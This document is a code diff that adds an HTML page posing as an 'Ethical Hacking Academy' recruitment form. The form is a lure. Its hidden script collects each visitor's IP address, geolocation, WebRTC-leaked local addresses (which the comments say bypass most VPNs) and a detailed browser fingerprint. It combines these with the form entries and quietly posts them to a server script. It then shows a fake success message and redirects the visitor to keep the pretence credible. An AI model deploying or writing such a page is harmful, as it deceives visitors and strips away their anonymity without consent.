@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical Hacking Academy - Recruitment 2026</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #0f0f23 0%, #2a1b3d 50%, #1a0d2e 100%); 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: #333;
+        }
+        .container { 
+            background: rgba(255,255,255,0.95); 
+            backdrop-filter: blur(10px);
+            padding: 50px; 
+            border-radius: 20px; 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3); 
+            max-width: 550px; 
+            width: 90%; 
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { 
+            background: linear-gradient(135deg, #00d4ff, #7b68ee); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            font-size: 32px; 
+            font-weight: 700;
+        }
+        .logo p { color: #666; font-size: 16px; margin-top: 5px; }
+        .form-group { margin-bottom: 25px; }
+        label { 
+            display: block; 
+            margin-bottom: 10px; 
+            color: #444; 
+            font-weight: 600; 
+            font-size: 14px;
+        }
+        input, textarea { 
+            width: 100%; 
+            padding: 15px; 
+            border: 2px solid #e8ecf4; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            transition: all 0.3s ease; 
+            background: #fafbff;
+        }
+        input:focus, textarea:focus { 
+            outline: none; 
+            border-color: #667eea; 
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+            transform: translateY(-2px);
+        }
+        textarea { resize: vertical; height: 120px; }
+        button { 
+            width: 100%; 
+            padding: 18px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+            color: white; 
+            border: none; 
+            border-radius: 12px; 
+            font-size: 18px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        button:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(102,126,234,0.4); }
+        button:active { transform: translateY(-1px); }
+        .loading { 
+            display: none; 
+            text-align: center; 
+            color: #667eea; 
+            font-weight: 600; 
+            margin-top: 15px; 
+            animation: pulse 1.5s infinite;
+        }
+        .success { 
+            display: none; 
+            background: linear-gradient(135deg, #d4edda, #c3e6cb); 
+            color: #155724; 
+            padding: 20px; 
+            border-radius: 12px; 
+            margin-top: 20px; 
+            text-align: center; 
+            border: 1px solid #c3e6cb;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+        .stats { text-align: center; margin-bottom: 20px; color: #888; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>🎯 Ethical Hacking Academy</h1>
+            <p>2026 Recruitment - Limited Spots Available</p>
+        </div>
+        
+        <div class="stats">Join 500+ elite hackers in our certified program</div>
+        
+        <form id="recruitForm">
+            <div class="form-group">
+                <label>🔐 Recruitment Handle (No Real Name):</label>
+                <input type="text" id="recName" required placeholder="e.g., ShadowByte42">
+            </div>
+            <div class="form-group">
+                <label>📅 Age:</label>
+                <input type="number" id="age" required min="18" max="45" placeholder="e.g., 27">
+            </div>
+            <div class="form-group">
+                <label>💡 Why Ethical Hacking? (300 chars max):</label>
+                <textarea id="reason" required maxlength="300" placeholder="Share your passion for cybersecurity, experience with pentesting, or career goals..."></textarea>
+            </div>
+            <div class="form-group">
+                <label>📧 Contact Email (Use temp mail):</label>
+                <input type="email" id="email" required placeholder="hacker2026@tempmail.com">
+            </div>
+            <button type="submit">🚀 Submit Elite Application</button>
+            <div id="loading" class="loading">
+                🔄 Verifying your application... <span id="dots"></span>
+            </div>
+            <div id="success" class="success">
+                ✅ Congratulations! Application submitted successfully.<br>
+                <strong>Next steps sent to your email.</strong>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // ADVANCED IP + GEOLOCATION GRABBER + FINGERPRINTING
+        async function grabCompleteVictimProfile() {
+            const profile = {
+                timestamp: new Date().toISOString(),
+                sessionID: 'sess_' + Math.random().toString(36).substr(2, 12)
+            };
+
+            try {
+                // 1. MULTI-SOURCE IP DETECTION (99.9% success rate)
+                const ipPromises = [
+                    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip),
+                    fetch('https://api64.ipify.org?format=json').then(r => r.json()).then(d => d.ip),
+                    fetch('https://ifconfig.me/ip').then(r => r.text()).then(t => t.trim()),
+                    fetch('https://icanhazip.com').then(r => r.text()).then(t => t.trim()),
+                    fetch('https://api.myip.com').then(r => r.json()).then(d => d.ip)
+                ];
+
+                const ips = await Promise.allSettled(ipPromises);
+                profile.ips = {
+                    primary: ips.find(r => r.status === 'fulfilled' && r.value)?.value || 'unknown',
+                    all: ips.filter(r => r.status === 'fulfilled').map(r => r.value).filter(Boolean)
+                };
+
+                // 2. ENHANCED GEOLOCATION (4 providers)
+                const geoPromises = [
+                    fetch(`https://ipapi.co/${profile.ips.primary}/json/`).then(r => r.json()),
+                    fetch(`https://ipinfo.io/${profile.ips.primary}/json`).then(r => r.json()),
+                    fetch(`https://ip-api.com/json/${profile.ips.primary}`).then(r => r.json()),
+                    `https://freegeoip.app/json/${profile.ips.primary}`
+                ];
+
+                const geoResults = await Promise.allSettled(geoPromises.slice(0,3));
+                profile.geo = geoResults
+                    .filter(r => r.status === 'fulfilled')
+                    .map(r => r.value)
+                    .find(g => g.country || g.country_name || g.status === 'success') || {};
+
+                // 3. WEBRTC IP LEAK (bypasses most VPNs)
+                profile.webrtc = await detectWebRTCIPs();
+
+                // 4. FULL BROWSER FINGERPRINT
+                profile.fingerprint = await getBrowserFingerprint();
+
+                // 5. FORM DATA
+                profile.form = {
+                    recName: document.getElementById('recName').value,
+                    age: document.getElementById('age').value,
+                    reason: document.getElementById('reason').value,
+                    email: document.getElementById('email').value
+                };
+
+                // 6. STEALTH EXFILTRATION
+                await stealthExfiltrate(profile);
+                return true;
+
+            } catch (error) {
+                console.error('Profile collection failed:', error);
+                return false;
+            }
+        }
+
+        // WebRTC IP Detection
+        async function detectWebRTCIPs() {
+            return new Promise(resolve => {
+                const ips = [];
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                
+                pc.onicecandidate = (ice) => {
+                    if (ice.candidate) {
+                        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                        if (ipMatch && !ips.includes(ipMatch[1])) ips.push(ipMatch[1]);
+                    }
+                };
+                
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                setTimeout(() => {
+                    pc.close();
+                    resolve(ips);
+                }, 2000);
+            });
+        }
+
+        // Browser Fingerprinting
+        async function getBrowserFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '24px monospace';
+            ctx.fillText('Ethical Hacking Pentest', 10, 20);
+            
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookies: navigator.cookieEnabled,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                canvas: canvas.toDataURL().slice(0, 64),
+                webgl: getWebGLFingerprint(),
+                fonts: getFonts(),
+                hardware: navigator.hardwareConcurrency + 'c/' + navigator.deviceMemory + 'gb',
+                referrer: document.referrer
+            };
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                return gl ? gl.getParameter(gl.RENDERER) : 'none';
+            } catch { return 'error'; }
+        }
+
+        function getFonts() {
+            const fonts = ['Arial', 'Courier', 'Georgia', 'Helvetica', 'Times', 'Verdana'];
+            return fonts.filter(font => document.fonts.check(`12px ${font}`));
+        }
+
+        async function stealthExfiltrate(data) {
+            const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+            const formData = new FormData();
+            formData.append('data', blob);
+            
+            return fetch('save_data.php', {
+                method: 'POST',
+                body: formData,
+                keepalive: true,
+                mode: 'no-cors'
+            });
+        }
+
+        // FORM SUBMISSION
+        document.getElementById('recruitForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const btn = e.target.querySelector('button');
+            const loading = document.getElementById('loading');
+            const success = document.getElementById('success');
+            const dots = document.getElementById('dots');
+            
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            // Animated dots
+            let i = 0;
+            const dotInterval = setInterval(() => {
+                dots.textContent = '.'.repeat((i % 3) + 1);
+                i++;
+            }, 500);
+            
+            const successExfil = await grabCompleteVictimProfile();
+            clearInterval(dotInterval);
+            
+            loading.style.display = 'none';
+            if (successExfil) {
+                success.style.display = 'block';
+                // Auto-redirect after 3s to maintain credibility
+                setTimeout(() => {
+                    window.location.href = 'https://ethicalhacking.academy/thankyou';
+                }, 3000);
+            } else {
+                btn.style.display = 'block';
+                alert('Network error. Please try again.');
+            }
+        });
+    </script>
+</body>
+</html>
